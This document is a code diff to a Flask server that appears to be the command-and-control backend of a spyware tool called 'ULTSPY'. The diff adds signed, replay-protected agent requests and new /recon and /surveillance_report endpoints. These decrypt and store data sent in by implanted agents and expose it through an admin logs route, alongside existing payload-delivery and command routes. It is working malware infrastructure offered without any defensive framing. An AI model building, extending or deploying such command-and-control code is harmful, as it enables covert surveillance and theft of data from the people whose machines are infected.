@@ -5,6 +5,8 @@ import logging
 import base64
 import os
 import json
+import hmac
+import hashlib
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives.serialization import load_pem_public_key
@@ -21,6 +23,24 @@ logging.basicConfig(level=logging.INFO)
 
 TIMEOUT_SECONDS = 180
 ADMIN_API_KEY = os.environ.get('ADMIN_API_KEY', 'changeme')
+BACKEND_VERSION = os.environ.get('BACKEND_VERSION', 'dev')
+FRONTEND_VERSION = 'unknown'
+try:
+    pkg_path = os.path.join(os.path.dirname(__file__), '../frontend/package.json')
+    with open(pkg_path, 'r') as f:
+        FRONTEND_VERSION = json.load(f).get('version', 'unknown')
+except Exception:
+    pass
+
+CONFIG = {}
+ALLOWED_HOSTS = []
+if os.path.exists('config.json'):
+    with open('config.json', 'r') as f:
+        try:
+            CONFIG = json.load(f)
+            ALLOWED_HOSTS = CONFIG.get('allowed_hosts', [])
+        except Exception as e:
+            logging.warning('Failed to load config.json: %s', e)
 
 
 def require_api_key(f):
@@ -31,6 +51,61 @@ def require_api_key(f):
             abort(401)
         return f(*args, **kwargs)
     return wrapper
+
+@app.before_request
+def check_host_header():
+    host = request.headers.get('Host', '')
+    if ALLOWED_HOSTS and host not in ALLOWED_HOSTS:
+        logging.warning('Blocked request with host %s', host)
+        abort(404)
+
+NONCE_WINDOW = 50
+
+@app.before_request
+def verify_request():
+    if request.path in ('/key_exchange',) or request.path.startswith('/admin') or request.path.startswith('/config'):
+        return
+    uuid = None
+    if request.view_args:
+        uuid = request.view_args.get('uuid')
+    if not uuid:
+        data = request.get_json(silent=True) or {}
+        uuid = data.get('uuid')
+    if not uuid:
+        return
+    client = Client.query.filter_by(uuid=uuid).first()
+    if not client or not client.aes_key:
+        abort(401)
+    sig = request.headers.get('X-ULTSPY-Signature')
+    nonce = request.headers.get('X-ULTSPY-Nonce')
+    ts = request.headers.get('X-ULTSPY-Timestamp')
+    if not sig or not nonce or not ts:
+        abort(401)
+    try:
+        ts_int = int(ts)
+    except ValueError:
+        abort(401)
+    if abs(datetime.utcnow().timestamp() - ts_int) > 60:
+        logging.warning('Timestamp mismatch for %s', uuid)
+        abort(401)
+    if NonceRecord.query.filter_by(client_id=client.id, nonce=nonce).first():
+        logging.warning('Replay attack for %s', uuid)
+        abort(401)
+    url = request.base_url
+    if request.query_string:
+        url += '?' + request.query_string.decode()
+    body = request.get_data(as_text=True) if request.method != 'GET' else ''
+    message = f"{request.method}\n{url}\n{ts}\n{body}"
+    key = base64.b64decode(client.aes_key)
+    expected = hmac.new(key, message.encode(), hashlib.sha256).digest()
+    expected_b64 = base64.b64encode(expected).decode()
+    if not hmac.compare_digest(expected_b64, sig):
+        logging.warning('Bad signature for %s', uuid)
+        abort(401)
+    db.session.add(NonceRecord(client_id=client.id, nonce=nonce))
+    cutoff = datetime.utcnow() - timedelta(minutes=10)
+    NonceRecord.query.filter(NonceRecord.created_at < cutoff).delete()
+    db.session.commit()
 
 class Client(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -51,6 +126,24 @@ class LogEntry(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
     message = db.Column(db.String(256))
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+class NonceRecord(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
+    nonce = db.Column(db.String(64))
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+class ReconData(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
+    data = db.Column(db.Text)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+class SurveillanceData(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
+    data = db.Column(db.Text)
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
 
 def log_event(client, message):
@@ -170,6 +263,68 @@ def get_payload(uuid, module):
     return jsonify({'payload': blob})
 
 
+@app.route('/recon/<uuid>', methods=['POST'])
+def recon(uuid):
+    client = Client.query.filter_by(uuid=uuid).first()
+    if not client or not client.aes_key:
+        return jsonify({'error': 'unknown'}), 404
+    data = request.get_json(force=True)
+    blob = data.get('data')
+    if not blob:
+        return jsonify({'error': 'invalid'}), 400
+    try:
+        raw = base64.b64decode(blob)
+        key = base64.b64decode(client.aes_key)
+        iv = raw[:16]
+        enc = raw[16:]
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+        decryptor = cipher.decryptor()
+        padded = decryptor.update(enc) + decryptor.finalize()
+        unpad = sympadding.PKCS7(128).unpadder()
+        plain = unpad.update(padded) + unpad.finalize()
+        text = plain.decode()
+        if app.debug:
+            logging.info('Recon from %s: %s', uuid, text)
+        rec = ReconData(client_id=client.id, data=text)
+        db.session.add(rec)
+        db.session.commit()
+    except Exception as e:
+        logging.warning('Failed recon decode for %s: %s', uuid, e)
+        return jsonify({'error': 'decode'}), 400
+    return jsonify({'status': 'ok'})
+
+
+@app.route('/surveillance_report/<uuid>', methods=['POST'])
+def surveillance_report(uuid):
+    client = Client.query.filter_by(uuid=uuid).first()
+    if not client or not client.aes_key:
+        return jsonify({'error': 'unknown'}), 404
+    data = request.get_json(force=True)
+    blob = data.get('data')
+    if not blob:
+        return jsonify({'error': 'invalid'}), 400
+    try:
+        raw = base64.b64decode(blob)
+        key = base64.b64decode(client.aes_key)
+        iv = raw[:16]
+        enc = raw[16:]
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+        decryptor = cipher.decryptor()
+        padded = decryptor.update(enc) + decryptor.finalize()
+        unpad = sympadding.PKCS7(128).unpadder()
+        plain = unpad.update(padded) + unpad.finalize()
+        text = plain.decode()
+        if app.debug:
+            logging.info('Surveillance from %s: %s', uuid, text)
+        rec = SurveillanceData(client_id=client.id, data=text)
+        db.session.add(rec)
+        db.session.commit()
+    except Exception as e:
+        logging.warning('Failed surveillance decode for %s: %s', uuid, e)
+        return jsonify({'error': 'decode'}), 400
+    return jsonify({'status': 'ok'})
+
+
 @app.route('/status/<uuid>', methods=['GET'])
 def status(uuid):
     check_timeouts()
@@ -179,6 +334,25 @@ def status(uuid):
     state = 'online' if client.online else 'offline'
     last = client.last_seen.isoformat() if client.last_seen else None
     return jsonify({'uuid': uuid, 'status': state, 'last_seen': last})
+
+@app.route('/config/targets', methods=['GET'])
+def list_targets():
+    return jsonify({'targets': ALLOWED_HOSTS})
+
+
+@app.route('/admin/config', methods=['GET'])
+@require_api_key
+def admin_config():
+    return jsonify({
+        'api_keys': ['default'],
+        'heartbeat_timeout': TIMEOUT_SECONDS,
+        'versions': {
+            'backend': BACKEND_VERSION,
+            'frontend': FRONTEND_VERSION,
+        },
+        'targets': ALLOWED_HOSTS,
+        'allowed_hosts': ALLOWED_HOSTS,
+    })
 
 
 @app.route('/admin/agents', methods=['GET'])
@@ -199,13 +373,37 @@ def list_agents():
 @app.route('/admin/logs/<uuid>', methods=['GET'])
 @require_api_key
 def agent_logs(uuid):
+    """Return recon reports, surveillance data and log messages for an agent."""
     client = Client.query.filter_by(uuid=uuid).first()
     if not client:
         return jsonify({'logs': []})
-    logs = LogEntry.query.filter_by(client_id=client.id).order_by(LogEntry.created_at.desc()).all()
-    return jsonify({'logs': [
-        {'message': l.message, 'timestamp': l.created_at.isoformat()} for l in logs
-    ]})
+
+    entries = []
+    for l in LogEntry.query.filter_by(client_id=client.id).all():
+        entries.append({
+            'timestamp': l.created_at.replace(tzinfo=None).isoformat() + 'Z',
+            'type': 'Info',
+            'description': l.message,
+        })
+
+    for r in ReconData.query.filter_by(client_id=client.id).all():
+        entries.append({
+            'timestamp': r.created_at.replace(tzinfo=None).isoformat() + 'Z',
+            'type': 'Recon',
+            'description': 'Recon data',
+            'data': r.data,
+        })
+
+    for s in SurveillanceData.query.filter_by(client_id=client.id).all():
+        entries.append({
+            'timestamp': s.created_at.replace(tzinfo=None).isoformat() + 'Z',
+            'type': 'Surveillance',
+            'description': 'Surveillance report',
+            'data': s.data,
+        })
+
+    entries.sort(key=lambda x: x['timestamp'], reverse=True)
+    return jsonify({'logs': entries})
 
 
 @app.route('/admin/command/<uuid>', methods=['POST'])
